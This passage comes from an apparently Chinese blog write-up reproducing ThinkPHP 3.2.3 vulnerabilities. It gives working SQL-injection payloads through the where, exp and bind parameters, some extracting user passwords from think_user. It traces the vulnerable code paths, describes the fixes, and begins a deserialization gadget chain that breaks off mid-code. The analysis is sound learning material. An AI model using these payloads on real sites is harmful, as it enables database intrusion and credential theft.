    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>传参得到我们的查询结果</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20231227004644539.png" alt="image-20231227004644539"></p>
<hr>
<h2 id="3-2-3where注入"><a href="#3-2-3where注入" class="headerlink" title="3.2.3where注入"></a>3.2.3where注入</h2><p>入口：Application&#x2F;Home&#x2F;Controller&#x2F;IndexController.class.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> think_user <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在<code>$data</code>处下个断点</p>
<p>简单在id处传入一个<code>id=1&#39;</code></p>
<p>然后一路跟进到 ThinkPHP&#x2F;Common&#x2F;functions.php:391</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240305003735627.png" alt="image-20240305003735627"></p>
<p>此时会进入<code>htmlspecialchars()</code>进行处理</p>
<p>最后会在<code>ThinkPHP/Common/functions.php:442</code>回调<code>think_filter</code>函数进行过滤</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240305004146769.png" alt="image-20240305004146769"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">// TODO 其他安全过滤</span>

    <span class="token comment">// 过滤查询特殊字符</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$value</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来进入<code>ThinkPHP/Library/Think/Model.class.php:779</code>的<code>find()</code>方法，又会经过<code>ThinkPHP/Library/Think/Model.class.php:811</code> <code>_parseOptions()</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240305004347209.png" alt="image-20240305004347209"></p>
<p>此时id依旧是<code>1&#39;</code></p>
<p>跟进<code>_parseOptions()</code> <code>ThinkPHP/Library/Think/Model.class.php:681</code> 其中会经过类型验证<code>_parseType()</code>函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">_parseType</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fields</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_type'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$fieldType</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fields</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_type'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fieldType</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'enum'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 支持ENUM类型优先检测</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fieldType</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bigint'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fieldType</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'int'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fieldType</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'float'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword type-declaration">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fieldType</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'double'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fieldType</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bool'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">bool</span><span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这里会把 id 进行强制类型转换，然后返回给<code>_parseOptions()</code>，最终带入<code>$this-&gt;db-&gt;select($options)</code>进行查询从而避免注入问题</p>
<p>总结一下上面的链子：传入<code>id=1&#39;</code> -&gt; <code>I()</code> -&gt; <code>find()</code> -&gt; <code>_parseOptions()</code> -&gt; <code>_parseType()</code> 然后将我们的字符串清理了</p>
<p>而我们的id参数被改变的位置就在<code>_parseType()</code>中，进入这个方法的位置是<code>ThinkPHP/Library/Think/Model.class.php:704</code> </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 字段类型验证</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$fields</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// 对数组查询条件进行字段类型检查</span>
          <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fields</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_scalar</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_parseType</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'_'</span> <span class="token operator">!=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'('</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'|'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'strict'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      <span class="token function">E</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_ERROR_QUERY_EXPRESS_'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':['</span> <span class="token operator">.</span> <span class="token variable">$key</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'=>'</span> <span class="token operator">.</span> <span class="token variable">$val</span> <span class="token operator">.</span> <span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                  <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>于是想要避免进入<code>_parseType()</code>，只需要让第一个if判断不成立即可</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$fields</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后接下来就是一路跟进到sql语句执行的部分了，可以看到这里的<code>&#39;</code>已经被转义了</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240305173027812.png" alt="image-20240305173027812"></p>
<p>所以注入的payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>id<span class="token punctuation">[</span>where<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地复现不出上面报错注入的payload，不知道为什么（24&#x2F;07&#x2F;19更新：注意查询的表名，应该是<code>think_user</code>，已更正）</p>
<p>不过可以联合注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span>id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> think_user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240305011732127.png" alt="image-20240305011732127"></p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04">https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04</a></p>
<p><code>v3.2.4</code>将<code>$options</code>和<code>$this-&gt;options</code>进行了区分，从而传入的参数无法污染到<code>$this-&gt;options</code>，也就无法控制sql语句了</p>
<hr>
<h2 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a>exp注入</h2><p>环境：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$User</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// $map = array('username' => I('username'));</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$User</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>exp<span class="token operator">&amp;</span>username<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>参考<a href="https://c1oudfl0w0.github.io/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98">ctfshow web577</a></p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>使用<code>I()</code>函数代替超全局数组获取变量</p>
<hr>
<h2 id="3-2-3bind注入"><a href="#3-2-3bind注入" class="headerlink" title="3.2.3bind注入"></a>3.2.3bind注入</h2><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>bind<span class="token operator">&amp;</span>id<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>暂时咕咕了</p>
<hr>
<h2 id="3-2-3反序列化链子"><a href="#3-2-3反序列化链子" class="headerlink" title="3.2.3反序列化链子"></a>3.2.3反序列化链子</h2><p>利用条件：具备反序列化入口</p>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>先在控制器里写一个反序列化入口</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来找反序列化链头</p>
<p>因为大多数反序列化漏洞，都是由<code>__destruct()</code>魔术方法引起的，因此全局搜索<code>public function __destruct()</code></p>
<p>tip：在寻找<code>__destruct()</code>可用的魔术方法需遵循“<strong>可控变量尽可能多</strong>”的原则，比如下图这个，没啥可控参数，就不好利用</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240305225517889.png" alt="image-20240305225517889"></p>
<p>而这条链子的起始位置就在 ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Image&#x2F;Driver&#x2F;Imagick.class.php</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240305231407562.png" alt="image-20240305231407562"></p>
<p>img是我们可控的，对img属性赋一个对象，则会调用<code>destroy()</code>方法（注：PHP7版本中，如果调用一个含参数的方法，却不传入参数时，ThinkPHP会报错，而在PHP5版本中不会报错）</p>
<p>接下来全局搜索<code>public function destroy</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240305232420669.png" alt="image-20240305232420669"></p>
<p>在 ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Model.class.php 中，<code>destroy()</code>方法有两个可控参数，调用的是<code>delete</code>方法</p>
<p>这里的 delete 方法的参数看似可控，其实不可控，因为下方全局搜索后，<code>delete</code>方法需要的参数大多数都为<code>array</code>形式，而上方传入的是<code>$this-&gt;sessionName.$sessID</code>，即使<code>$this-&gt;sesionName</code>设置为数组<code>array</code>，但是<code>$sessID</code>如果为空值，在PHP中，用<code>.</code>连接符连接，得到的结果为字符串<code>array</code>，这个点在自增rce的时候就提过了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token operator">=></span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
string(5) "Array"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>尽管这里不可控，我们还是先全局搜索<code>public function delete</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240306002549516.png" alt="image-20240306002549516"></p>
<p>注意到 ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Model.class.php 这里的 delete 方法又调用了一次 delete 方法，而这里传入的参数是完全可控的</p>
<p>我们先在这个方法下 echo 一个值 “0w0”，整合一下前面的链子验证一下思路是否正确</p>
<p>前面一共涉及到三个类，链子为<code>Imagick -&gt; Memcache -&gt; Model</code>，我们在<code>Model.class.php</code>中打印一个值，构造这三个类序列化字符串：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Image<span class="token punctuation">\</span>Driver</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Imagick</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$img</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Think<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Driver</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
